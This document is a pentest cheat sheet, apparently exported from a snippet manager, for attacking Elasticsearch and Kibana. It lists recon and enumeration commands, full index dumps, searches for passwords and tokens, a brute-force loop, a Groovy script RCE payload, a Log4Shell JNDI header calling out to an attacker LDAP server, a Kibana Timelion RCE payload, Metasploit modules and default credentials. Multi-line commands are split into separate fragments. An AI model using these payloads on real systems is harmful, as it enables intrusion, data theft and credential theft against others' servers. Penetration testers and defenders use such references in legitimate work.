---
id: "t87j6h23fmptl1kuy"
title: "elasticsearch"
description: ""
tags: []
order: 10
createdAt: "2026-05-31T09:33:53.242Z"
updatedAt: "2026-05-31T09:34:05.669Z"
---

## Reconnaissance
<!-- section: {"id":"zlvui8hiumptl1u11","order":0,"collapsed":false} -->

### sjsekfunxmptl1u34
```bash
nmap -sV -sC -p 9200,9300 $TARGET
```

_Reconnaissance Scan for Elasticsearch default ports._

**Tags:** elasticsearch, recon, nmap
<!-- cmd: {"id":"sjsekfunxmptl1u34","language":"bash","sectionId":"zlvui8hiumptl1u11","tags":["elasticsearch","recon","nmap"]} -->

### ews1p03h1mptl1u38
```bash
rustscan -a $TARGET -p 9200,9300 -- -sV -sC
```

**Tags:** elasticsearch, recon, nmap
<!-- cmd: {"id":"ews1p03h1mptl1u38","language":"bash","sectionId":"zlvui8hiumptl1u11","tags":["elasticsearch","recon","nmap"]} -->

### p8u20wum1mptl1u3d
```bash
curl -s http://$TARGET:9200/
```

**Tags:** elasticsearch, recon, nmap
<!-- cmd: {"id":"p8u20wum1mptl1u3d","language":"bash","sectionId":"zlvui8hiumptl1u11","tags":["elasticsearch","recon","nmap"]} -->

### yb48783onmptl1u3h
```bash
curl -s http://$TARGET:9200/_cat/indices
```

**Tags:** elasticsearch, recon, nmap
<!-- cmd: {"id":"yb48783onmptl1u3h","language":"bash","sectionId":"zlvui8hiumptl1u11","tags":["elasticsearch","recon","nmap"]} -->

## Unauthenticated Enumeration
<!-- section: {"id":"j7enf6kvkmptl1u18","order":1,"collapsed":false} -->

### chc9kxzrzmptl1u3z
```bash
curl -s http://$TARGET:9200/
```

_Unauthenticated Enumeration Most default Elasticsearch deployments have no auth._

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"chc9kxzrzmptl1u3z","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### cx5hqxm6hmptl1u43
```bash
curl -s http://$TARGET:9200/_cluster/health | python3 -m json.tool
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"cx5hqxm6hmptl1u43","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### qab4g0pyvmptl1u48
```bash
curl -s http://$TARGET:9200/_cluster/settings | python3 -m json.tool
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"qab4g0pyvmptl1u48","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### bq2sn35a7mptl1u4d
```bash
curl -s http://$TARGET:9200/_cat/indices?v
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"bq2sn35a7mptl1u4d","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### lf80yiylumptl1u4h
```bash
curl -s http://$TARGET:9200/_cat/indices?h=index,docs.count,store.size
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"lf80yiylumptl1u4h","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### ozjptl8cfmptl1u4l
```bash
curl -s http://$TARGET:9200/_cat/nodes?v
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"ozjptl8cfmptl1u4l","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### d2xc4kyx2mptl1u4r
```bash
curl -s http://$TARGET:9200/_cluster/stats | python3 -m json.tool
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"d2xc4kyx2mptl1u4r","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

### 9vhax7k0imptl1u4v
```bash
curl -s http://$TARGET:9200/_cat/pending_tasks
```

**Tags:** elasticsearch, unauthenticated, enumeration
<!-- cmd: {"id":"9vhax7k0imptl1u4v","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->

## Data Extraction
<!-- section: {"id":"84j3ub3mumptl1u1e","order":2,"collapsed":false} -->

### lhbnoxwaomptl1u5b
```bash
curl -s "http://$TARGET:9200/$INDEX/_search?pretty&size=1000"
```

_Data Extraction Dump all data from indices._

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"lhbnoxwaomptl1u5b","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### ua06tiycamptl1u5h
```bash
curl -s "http://$TARGET:9200/$INDEX/_search?q=*&size=10000&pretty"
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"ua06tiycamptl1u5h","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### slworaltxmptl1u5m
```bash
curl -s "http://$TARGET:9200/$INDEX/_search?scroll=1m" -H "Content-Type: application/json" \
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"slworaltxmptl1u5m","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### d1ok8vw7wmptl1u5r
```bash
  -d '{"size": 1000, "query": {"match_all": {}}}'
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"d1ok8vw7wmptl1u5r","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### v8snvh1c6mptl1u5w
```bash
elasticdump --input=http://$TARGET:9200/$INDEX --output=/tmp/dump.json --type=data
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"v8snvh1c6mptl1u5w","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### 0upvvm3hpmptl1u60
```bash
elasticdump --input=http://$TARGET:9200 --output=/tmp/ --all --type=data
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"0upvvm3hpmptl1u60","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### tky1i6fiemptl1u64
```bash
curl -s "http://$TARGET:9200/_search?pretty" -H "Content-Type: application/json" \
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"tky1i6fiemptl1u64","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### o32roaomsmptl1u69
```bash
  -d '{"query":{"query_string":{"query":"password OR passwd OR secret OR token OR api_key"}}}'
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"o32roaomsmptl1u69","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

### 29ddffcu3mptl1u6f
```bash
curl -s "http://$TARGET:9200/_all/_search?q=password&size=100&pretty"
```

**Tags:** elasticsearch, datadump, exfiltration, credentials
<!-- cmd: {"id":"29ddffcu3mptl1u6f","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->

## Index Mapping (Schema)
<!-- section: {"id":"bidpk2033mptl1u1i","order":3,"collapsed":false} -->

### 6489e8vymmptl1u6u
```bash
curl -s http://$TARGET:9200/$INDEX/_mapping | python3 -m json.tool
```

_Index Mapping (Schema) Understand data structure before dumping._

**Tags:** elasticsearch, enumeration, mapping
<!-- cmd: {"id":"6489e8vymmptl1u6u","language":"bash","sectionId":"bidpk2033mptl1u1i","tags":["elasticsearch","enumeration","mapping"]} -->

### la4kl0o81mptl1u6z
```bash
curl -s http://$TARGET:9200/_all/_mapping | python3 -m json.tool
```

**Tags:** elasticsearch, enumeration, mapping
<!-- cmd: {"id":"la4kl0o81mptl1u6z","language":"bash","sectionId":"bidpk2033mptl1u1i","tags":["elasticsearch","enumeration","mapping"]} -->

### 2io1m9mdbmptl1u74
```bash
curl -s "http://$TARGET:9200/$INDEX/_search?size=1&pretty"
```

**Tags:** elasticsearch, enumeration, mapping
<!-- cmd: {"id":"2io1m9mdbmptl1u74","language":"bash","sectionId":"bidpk2033mptl1u1i","tags":["elasticsearch","enumeration","mapping"]} -->

### v7egnr7xbmptl1u79
```bash
curl -s http://$TARGET:9200/$INDEX/_count
```

**Tags:** elasticsearch, enumeration, mapping
<!-- cmd: {"id":"v7egnr7xbmptl1u79","language":"bash","sectionId":"bidpk2033mptl1u1i","tags":["elasticsearch","enumeration","mapping"]} -->

## Authentication
<!-- section: {"id":"8qg0heccbmptl1u1m","order":4,"collapsed":false} -->

### cvqqcycxrmptl1u7k
```bash
curl -s -u $USER:$PASS http://$TARGET:9200/
```

_Authentication Connect with credentials (X-Pack security)._

**Tags:** elasticsearch, authentication
<!-- cmd: {"id":"cvqqcycxrmptl1u7k","language":"bash","sectionId":"8qg0heccbmptl1u1m","tags":["elasticsearch","authentication"]} -->

### 8yyvq7z22mptl1u7o
```bash
curl -s -u $USER:$PASS http://$TARGET:9200/_cat/indices?v
```

**Tags:** elasticsearch, authentication
<!-- cmd: {"id":"8yyvq7z22mptl1u7o","language":"bash","sectionId":"8qg0heccbmptl1u1m","tags":["elasticsearch","authentication"]} -->

### eezccpfscmptl1u7s
```bash
curl -s -H "Authorization: Basic $(echo -n $USER:$PASS | base64)" http://$TARGET:9200/
```

**Tags:** elasticsearch, authentication
<!-- cmd: {"id":"eezccpfscmptl1u7s","language":"bash","sectionId":"8qg0heccbmptl1u1m","tags":["elasticsearch","authentication"]} -->

### yz6f80pivmptl1u7y
```bash
curl -s -H "Authorization: ApiKey $API_KEY" http://$TARGET:9200/
```

**Tags:** elasticsearch, authentication
<!-- cmd: {"id":"yz6f80pivmptl1u7y","language":"bash","sectionId":"8qg0heccbmptl1u1m","tags":["elasticsearch","authentication"]} -->

## Brute Force
<!-- section: {"id":"6w6xsessgmptl1u1p","order":5,"collapsed":false} -->

### sm7qfezd5mptl1u8f
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET http-get /
```

_Brute Force_

**Tags:** elasticsearch, bruteforce
<!-- cmd: {"id":"sm7qfezd5mptl1u8f","language":"bash","sectionId":"6w6xsessgmptl1u1p","tags":["elasticsearch","bruteforce"]} -->

### 588q8ue02mptl1u8i
```bash
for pass in $(cat rockyou.txt); do
```

**Tags:** elasticsearch, bruteforce
<!-- cmd: {"id":"588q8ue02mptl1u8i","language":"bash","sectionId":"6w6xsessgmptl1u1p","tags":["elasticsearch","bruteforce"]} -->

### iqz12vex1mptl1u8o
```bash
  code=$(curl -s -o /dev/null -w "%{http_code}" -u elastic:$pass http://$TARGET:9200/)
```

**Tags:** elasticsearch, bruteforce
<!-- cmd: {"id":"iqz12vex1mptl1u8o","language":"bash","sectionId":"6w6xsessgmptl1u1p","tags":["elasticsearch","bruteforce"]} -->

### xyymznja9mptl1u8u
```bash
  [ "$code" = "200" ] && echo "FOUND: elastic:$pass" && break
```

**Tags:** elasticsearch, bruteforce
<!-- cmd: {"id":"xyymznja9mptl1u8u","language":"bash","sectionId":"6w6xsessgmptl1u1p","tags":["elasticsearch","bruteforce"]} -->

### 8rvx98j49mptl1u8y
```bash
done
```

**Tags:** elasticsearch, bruteforce
<!-- cmd: {"id":"8rvx98j49mptl1u8y","language":"bash","sectionId":"6w6xsessgmptl1u1p","tags":["elasticsearch","bruteforce"]} -->

## Sensitive Data Hunting
<!-- section: {"id":"7cy5lw75dmptl1u1u","order":6,"collapsed":false} -->

### 1kv2rm6gxmptl1u97
```bash
for index in users accounts passwords credentials secrets tokens api_keys logs audit; do
```

_Sensitive Data Hunting Common index names that contain valuable data._

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"1kv2rm6gxmptl1u97","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### 4p9zditnsmptl1u9b
```bash
  count=$(curl -s "http://$TARGET:9200/$index/_count" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('count','N/A'))" 2>/dev/null)
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"4p9zditnsmptl1u9b","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### tvcawhpb6mptl1u9g
```bash
  echo "$index: $count docs"
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"tvcawhpb6mptl1u9g","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### e2dcljt5pmptl1u9k
```bash
done
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"e2dcljt5pmptl1u9k","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### ui5hjvdctmptl1u9o
```bash
curl -s "http://$TARGET:9200/.kibana/_search?pretty&size=10"
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"ui5hjvdctmptl1u9o","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### ulvy67k6ymptl1u9t
```bash
curl -s "http://$TARGET:9200/logstash-*/_search?q=password&size=10&pretty"
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"ulvy67k6ymptl1u9t","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### r7cwhr5famptl1u9y
```bash
curl -s "http://$TARGET:9200/filebeat-*/_search?q=password&size=10&pretty"
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"r7cwhr5famptl1u9y","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### cxf6ozqqdmptl1ua2
```bash
curl -s "http://$TARGET:9200/.security*/_search?pretty&size=100"
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"cxf6ozqqdmptl1ua2","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

### yqxc6fkxxmptl1ua6
```bash
curl -s "http://$TARGET:9200/.kibana/_search?pretty"
```

**Tags:** elasticsearch, sensitive-data, credentials, hunting
<!-- cmd: {"id":"yqxc6fkxxmptl1ua6","language":"bash","sectionId":"7cy5lw75dmptl1u1u","tags":["elasticsearch","sensitive-data","credentials","hunting"]} -->

## RCE via Dynamic Scripts (Old Versions)
<!-- section: {"id":"zp6z9qpvwmptl1u1y","order":7,"collapsed":false} -->

### fdmymerkbmptl1uas
```bash
curl -s -X POST "http://$TARGET:9200/_search" -H "Content-Type: application/json" -d '{
```

_RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Groovy/MVEL script execution._

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"fdmymerkbmptl1uas","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### 9l7zc9qhimptl1uax
```bash
  "size": 1,
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"9l7zc9qhimptl1uax","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### n01v57ygmmptl1ub1
```bash
  "query": {"filtered": {"query": {"match_all": {}}}},
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"n01v57ygmmptl1ub1","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### gx7actu12mptl1ub6
```bash
  "script_fields": {
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"gx7actu12mptl1ub6","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### 5oc59hsgcmptl1uba
```bash
    "cmd": {
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"5oc59hsgcmptl1uba","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### wvqjucmtsmptl1ubf
```bash
      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"wvqjucmtsmptl1ubf","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### m87hlo6simptl1ubj
```bash
    }
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"m87hlo6simptl1ubj","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### jb2d7ezfmmptl1ubo
```bash
  }
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"jb2d7ezfmmptl1ubo","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### 81nd0dcuumptl1ubs
```bash
}'
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"81nd0dcuumptl1ubs","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### kth0tvqt9mptl1ubx
```bash
use exploit/multi/elasticsearch/script_mvel_rce
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"kth0tvqt9mptl1ubx","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### hb5049m0vmptl1uc1
```bash
set RHOSTS $TARGET
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"hb5049m0vmptl1uc1","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### dmwugptgsmptl1uc6
```bash
set RPORT 9200
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"dmwugptgsmptl1uc6","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

### 35kmmvgr9mptl1ucb
```bash
run
```

**Tags:** elasticsearch, rce, groovy, cve, exploitation
<!-- cmd: {"id":"35kmmvgr9mptl1ucb","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->

## RCE via File Write (Log4Shell in Elastic Stack)
<!-- section: {"id":"5rz446955mptl1u22","order":8,"collapsed":false} -->

### lsqn5okjvmptl1ucl
```bash
curl -s "http://$TARGET:9200/" -H 'X-Api-Version: ${jndi:ldap://$LHOST:1389/exploit}'
```

_RCE via File Write (Log4Shell in Elastic Stack)_

**Tags:** elasticsearch, log4shell, log4j, rce, cve
<!-- cmd: {"id":"lsqn5okjvmptl1ucl","language":"bash","sectionId":"5rz446955mptl1u22","tags":["elasticsearch","log4shell","log4j","rce","cve"]} -->

### ozx2694g7mptl1ucp
```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://$LHOST:8888/#Exploit"
```

**Tags:** elasticsearch, log4shell, log4j, rce, cve
<!-- cmd: {"id":"ozx2694g7mptl1ucp","language":"bash","sectionId":"5rz446955mptl1u22","tags":["elasticsearch","log4shell","log4j","rce","cve"]} -->

## Kibana Exploitation
<!-- section: {"id":"iqpm7z97lmptl1u28","order":9,"collapsed":false} -->

### x50h3fvy2mptl1ud8
```bash
curl -s http://$TARGET:5601/api/status
```

_Kibana Exploitation_

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"x50h3fvy2mptl1ud8","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### ws5140cvamptl1ude
```bash
curl -s -X POST "http://$TARGET:5601/api/timelion/run" \
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"ws5140cvamptl1ude","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### 5qa3x15c5mptl1udh
```bash
  -H "Content-Type: application/json" \
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"5qa3x15c5mptl1udh","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### 30un4ulhhmptl1udm
```bash
  -H "kbn-xsrf: true" \
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"30un4ulhhmptl1udm","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### woafqt4zymptl1udq
```bash
  -d '{"sheet":["#"])}\nvar process = require(\"child_process\");process.exec(\"id > /tmp/pwned\");"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"UTC"}}'
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"woafqt4zymptl1udq","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### p0ns8hmy9mptl1udv
```bash
use exploit/multi/elastic/kibana_timelion_prototype_pollution_rce
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"p0ns8hmy9mptl1udv","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### neuza1pjvmptl1ue0
```bash
set RHOSTS $TARGET
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"neuza1pjvmptl1ue0","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### ehqjk9be9mptl1ue4
```bash
set RPORT 5601
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"ehqjk9be9mptl1ue4","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

### ugzjetgixmptl1ue9
```bash
run
```

**Tags:** kibana, rce, cve, exploitation
<!-- cmd: {"id":"ugzjetgixmptl1ue9","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->

## Common Misconfigurations
<!-- section: {"id":"t248od8ikmptl1u2d","order":10,"collapsed":false} -->

### 0ru5zqqbpmptl1ueo
```bash
curl -s http://$TARGET:9200/ | grep version
```

_Common Misconfigurations_

**Tags:** elasticsearch, misconfiguration, hardening
<!-- cmd: {"id":"0ru5zqqbpmptl1ueo","language":"bash","sectionId":"t248od8ikmptl1u2d","tags":["elasticsearch","misconfiguration","hardening"]} -->

### mehzm2kw4mptl1uet
```bash
curl -s http://$TARGET:9200/_cluster/settings | grep script
```

**Tags:** elasticsearch, misconfiguration, hardening
<!-- cmd: {"id":"mehzm2kw4mptl1uet","language":"bash","sectionId":"t248od8ikmptl1u2d","tags":["elasticsearch","misconfiguration","hardening"]} -->

### 3t1g938xkmptl1uex
```bash
curl -s http://$TARGET:9200/_cat/nodes?v
```

**Tags:** elasticsearch, misconfiguration, hardening
<!-- cmd: {"id":"3t1g938xkmptl1uex","language":"bash","sectionId":"t248od8ikmptl1u2d","tags":["elasticsearch","misconfiguration","hardening"]} -->

### 36wropq5jmptl1uf1
```bash
curl -s http://$TARGET:5601/api/status
```

**Tags:** elasticsearch, misconfiguration, hardening
<!-- cmd: {"id":"36wropq5jmptl1uf1","language":"bash","sectionId":"t248od8ikmptl1u2d","tags":["elasticsearch","misconfiguration","hardening"]} -->

### jge6wsif8mptl1uf5
```bash
curl -s http://$TARGET:9200/_xpack/security/_authenticate 2>/dev/null
```

**Tags:** elasticsearch, misconfiguration, hardening
<!-- cmd: {"id":"jge6wsif8mptl1uf5","language":"bash","sectionId":"t248od8ikmptl1u2d","tags":["elasticsearch","misconfiguration","hardening"]} -->

## Default Credentials
<!-- section: {"id":"wo7azp2w2mptl1u2h","order":11,"collapsed":false} -->

### 222wlbuvimptl1ufm
```bash
elastic    : changeme        (X-Pack default)
```

_Default Credentials_

**Tags:** elasticsearch, default-credentials
<!-- cmd: {"id":"222wlbuvimptl1ufm","language":"bash","sectionId":"wo7azp2w2mptl1u2h","tags":["elasticsearch","default-credentials"]} -->

### 556o615m0mptl1ufr
```bash
elastic    : elastic
```

**Tags:** elasticsearch, default-credentials
<!-- cmd: {"id":"556o615m0mptl1ufr","language":"bash","sectionId":"wo7azp2w2mptl1u2h","tags":["elasticsearch","default-credentials"]} -->

### k11bfnpvkmptl1ufw
```bash
kibana     : changeme
```

**Tags:** elasticsearch, default-credentials
<!-- cmd: {"id":"k11bfnpvkmptl1ufw","language":"bash","sectionId":"wo7azp2w2mptl1u2h","tags":["elasticsearch","default-credentials"]} -->

### 197f260fkmptl1ufz
```bash
logstash   : changeme
```

**Tags:** elasticsearch, default-credentials
<!-- cmd: {"id":"197f260fkmptl1ufz","language":"bash","sectionId":"wo7azp2w2mptl1u2h","tags":["elasticsearch","default-credentials"]} -->

### 3jjxetn93mptl1ug5
```bash
(no auth)  — default for older versions
```

**Tags:** elasticsearch, default-credentials
<!-- cmd: {"id":"3jjxetn93mptl1ug5","language":"bash","sectionId":"wo7azp2w2mptl1u2h","tags":["elasticsearch","default-credentials"]} -->
